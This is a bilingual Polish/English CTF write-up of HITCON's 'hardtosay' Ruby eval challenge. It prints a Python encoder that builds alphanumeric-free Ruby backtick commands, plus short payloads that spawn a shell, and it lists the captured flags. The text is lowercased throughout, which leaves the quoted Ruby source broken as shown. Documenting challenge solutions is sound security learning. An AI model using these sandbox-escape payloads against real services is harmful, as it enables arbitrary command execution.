﻿## hardtosay (misc, 200p, (111, 88, 73, 28) solves)

    ruby on fails.
    flag1: nc 54.199.215.185 9001
    flag2: nc 54.199.215.185 9002
    flag3: nc 54.199.215.185 9003
    flag4: nc 54.199.215.185 9004

    hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb

### pl
[eng](#eng-version)

dostajemy taki kod:

```ruby

#!/usr/bin/env ruby

fail 'flag?' unless file.file?('flag')

$stdout.sync = true

limit = argv[0].to_i
puts "hi, i can say #{limit} bytes :p"
s = $stdin.gets.strip!

if s.size > limit || s[/[[:alnum:]]/]
  puts 'oh... i cannot say this, maybe it is too long or too weird :('
  exit
end

puts "i think size = #{s.size} is ok to me."
r = eval(s).to_s
r[64..-1] = '...' if r.size > 64
puts r
```

jak widać pobiera on od użytkownika kod, i evaluje go - ale tylko pod warunkiem że nie zawiera znaków alfanumerycznych i jest odpowiednio krótki.

są cztery serwery z zadaniem - każdy z nich przyjmuje mniej znaków. pierwszy 1024, drugi 64, trzeci 36, a czwarty tylko 10. za pokonanie każdego dostajemy 50 punktów.

najlepszym rozwiązaniem na jakie wpadliśmy na początku to wykonanie operacji na shellu za pomocą backticków (``` ` ```) i interpolowania stringów.

opieramy się tutaj na kilku wartościach które są domyślnie dostępne w interpreterze, np. `$$` zwraca nam pid aktualnego procesu, więc wykonanie `$$/$$` da nam wynik `1`. możemy w ten sposób uzyskać dowolne liczby, a stosując `''<<number` możemy generować także dowolne znaki ascii.

napisaliśmy sobie prosty enkoder wykonujący dowolne (odpowiednio krótkie) polecenie shellowe:

```python
def encode(cmd):
    out = """a1 = $$/$$
    a2 = a1+a1
    a4 = a2+a2
    a8 = a4+a4
    a16 = a8+a8
    a32 = a16+a16
    a64 = a32+a32
    """

    ss = []
    for c in cmd:
        cc = ord(c)
        vs = []
        for b in range(8):
            if (2**b) & ord(c):
                vs.append('a'+str(2**b))
        ss.append('(' + '+'.join(vs) + ")")
    s = '(""<<' + '<<'.join(ss) + ")"

    end = "`#{" + s + "}`"

    start = out + end

    varnames = ['_'*i for i in range(1,10)][::-1]

    start = start.replace('a64', varnames.pop())
    start = start.replace('a32', varnames.pop())
    start = start.replace('a16', varnames.pop())
    start = start.replace('a8', varnames.pop())
    start = start.replace('a4', varnames.pop())
    start = start.replace('a2', varnames.pop())
    start = start.replace('a1', varnames.pop())
    start = ';'.join(start.split('\n'))
    return start

import sys
print encode(sys.argv[1])
```

flaga: `hitcon{what does the ruby say? @#$%!@&(%!#$&(%!@#$!$?...}`

+50 punktów. zdobyliśmy w ten sposób pierwszą flagę. niestety, okazało się że nie da się ukraść jednej flagi mając shella od drugiej flagi (brak uprawnień) i musieliśmy
kombinować dalej...

postanowiliśmy złożyć string "sh". i umieścić bo w backtickach aby wykonać go w shellu, uzyskując tym samym dostęp do shella. nasza druga próba, dla 64 znaków, wyglądała tak:

    _=$$;$_=*?`..?{;`#{$_[_*_+_-_/_]+$_[_+_]}`

flaga: `hitcon{ruby in peace m(_ _)m`

+50 punktów. a następnie dla 36 bajtów analogiczna operacja kodująca wywołanie sh:

    _=*?[..?{;`#{_[~--$$-$$]+_[~$$*$$]}`

flaga: `hitcon{my cats also know how to code in ruby :cat:}`

+50 punktów. później myśleliśmy dłuższą chwilę, ale wpadliśmy na to, że wykonanie `$0` również powinno dać nam shell - spróbowaliśmy więc:

    `$#{~-$.}`

gdzie `$.` to aktualny numer linii w stdin (czyli u nas 1). operacja `~-number` zwraca nam liczbę o 1 mniejszą, czyli 0. interpolujemy wynik jako stringa, doklejamy do znaku `$` i wywołujemy uzyskane `$0` w shellu uzyskując dostęp do shella.
flaga: `hitcon{it's hard to say where ruby went wrong qwo}`

w ten sposób zdobyliśmy kolejne 50 punktów, rozwiązując w ten sposób całe zadanie.

### eng version

we get the code:

```ruby

#!/usr/bin/env ruby

fail 'flag?' unless file.file?('flag')

$stdout.sync = true

limit = argv[0].to_i
puts "hi, i can say #{limit} bytes :p"
s = $stdin.gets.strip!

if s.size > limit || s[/[[:alnum:]]/]
  puts 'oh... i cannot say this, maybe it is too long or too weird :('
  exit
end

puts "i think size = #{s.size} is ok to me."
r = eval(s).to_s
r[64..-1] = '...' if r.size > 64
puts r
```

as can be seen, it gets data from the use and evaluates it with `eval()`, but only if it doesn't contain any alphanumerical characters and is short enough.

there are 4 instances of the task - each one accepts less characters. first 1024, second 64, third 36 and last one only 10. for beating each one we get 50 points.

the best solution we came up with initially was executing shell operations with (``` ` ```) and string interpolation.

we use here some numerical values that are accesible in the interpreter, eg. `$$` gives is pid of the process so calling `$$/$$` gives nam `1`. this way we can get any number and by using `''<<number` we can also generate any ascii.

we made a simple encoder that can create a code for us:

```python
def encode(cmd):
    out = """a1 = $$/$$
    a2 = a1+a1
    a4 = a2+a2
    a8 = a4+a4
    a16 = a8+a8
    a32 = a16+a16
    a64 = a32+a32
    """

    ss = []
    for c in cmd:
        cc = ord(c)
        vs = []
        for b in range(8):
            if (2**b) & ord(c):
                vs.append('a'+str(2**b))
        ss.append('(' + '+'.join(vs) + ")")
    s = '(""<<' + '<<'.join(ss) + ")"

    end = "`#{" + s + "}`"

    start = out + end

    varnames = ['_'*i for i in range(1,10)][::-1]

    start = start.replace('a64', varnames.pop())
    start = start.replace('a32', varnames.pop())
    start = start.replace('a16', varnames.pop())
    start = start.replace('a8', varnames.pop())
    start = start.replace('a4', varnames.pop())
    start = start.replace('a2', varnames.pop())
    start = start.replace('a1', varnames.pop())
    start = ';'.join(start.split('\n'))
    return start

import sys
print encode(sys.argv[1])
```

flag: `hitcon{what does the ruby say? @#$%!@&(%!#$&(%!@#$!$?...}`

+50 points. this way we got the first flag. unfortunately it was not possible to steal a different flag with the shell access we got (no permission) so we had to try harder.

we decided that we could prepare "sh" and put it in backticks to execute it in shell and get shell access. our first attempt for 64 characters:

    _=$$;$_=*?`..?{;`#{$_[_*_+_-_/_]+$_[_+_]}`

flag: `hitcon{ruby in peace m(_ _)m`

+50 points. next one for 36 characters similar attempt to call "sh":

    _=*?[..?{;`#{_[~--$$-$$]+_[~$$*$$]}`

flag: `hitcon{my cats also know how to code in ruby :cat:}`

+50 points. then we had to think for a while but we figured that executing `$0` in the shell should also give us shell so we tried:

    `$#{~-$.}`

where `$.` is current stdin line number (for us 1). operation `~-number` returns number-1, so in our case 0. we interpolate this as string and glue with `$` and execute the `$0` we just got, getting shell accesss.
flag: `hitcon{it's hard to say where ruby went wrong qwo}`

this way we got another 50 points and solved whole task.
